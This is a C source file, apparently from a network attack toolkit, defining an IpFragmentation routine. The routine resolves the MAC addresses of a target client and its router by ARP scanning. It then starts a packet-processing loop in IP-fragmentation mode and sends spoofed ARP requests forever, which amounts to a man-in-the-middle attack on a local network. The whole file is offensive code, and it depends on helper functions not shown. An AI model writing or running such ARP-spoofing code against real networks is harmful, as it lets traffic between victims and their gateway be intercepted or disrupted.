#include "Mode.h"
#include "Loop.h"
#include "Platform.h"
#include "ArpScan.h"
#include "IpFragmentation.h"
#include "ArpSend.h"
#include "Topology.h"

extern settings_t settings;

void IpFragmentation()
{
	item_t * item;
	
	int prev_loop_working_mode=settings.loop_working_mode;
	int prev_parce_packets_mode=settings.parce_packets_mode;

	ArpScanIp(settings.arp_spoofing_settings.ip_router);
	ArpScanIp(settings.arp_spoofing_settings.ip_client);

	item=FindItem(settings.arp_spoofing_settings.ip_router);

	if(!item)
	{
		printf("\nCan't resolve ip!\n\n");
		exit(0);
	}

	memcpy(settings.arp_spoofing_settings.mac_router, item->mac, 6);

	item=FindItem(settings.arp_spoofing_settings.ip_client);

	if(!item)
	{
		printf("\nCan't resolve ip!\n\n");
		exit(0);
	}

	memcpy(settings.arp_spoofing_settings.mac_client, item->mac, 6);

	printf("\nResolving has been done...\n\n");

	settings.loop_working_mode|=LOOP_MODE_IP_FRAGMENTATION;
	settings.parce_packets_mode|=PARCE_ETHERNET|PARCE_IP4;

	StartFunction(Loop, 0);

	while(1)
	{
		SendSpoofArpRequests();
		sleep(settings.arp_spoofing_settings.arp_spoofing_timeout);
	}

	CloseLoop();

	settings.loop_working_mode=prev_loop_working_mode;
	settings.parce_packets_mode=prev_parce_packets_mode;
}